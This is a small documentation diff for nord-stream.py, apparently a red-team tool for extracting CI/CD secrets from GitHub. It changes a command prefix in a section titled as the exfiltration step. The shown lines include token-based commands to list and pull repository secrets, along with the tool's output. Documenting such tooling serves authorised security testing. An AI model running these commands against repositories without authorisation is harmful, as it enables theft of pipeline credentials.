@@ -60,7 +60,7 @@ $ nord-stream.py github --token "$GHP" --org org --list-secrets --repo repo
 
 Then proceed to the exfiltration:
 ```sh
-python3 nord-stream.py github --token "$GHP" --org org --repo repo  
+$ nord-stream.py github --token "$GHP" --org org --repo repo  
 [+] "org/repo"
 [*] No branch protection rule found on "dev_remote_ea5Eu/test/v1" branch
 [*] Getting secrets from repo: "org/repo"
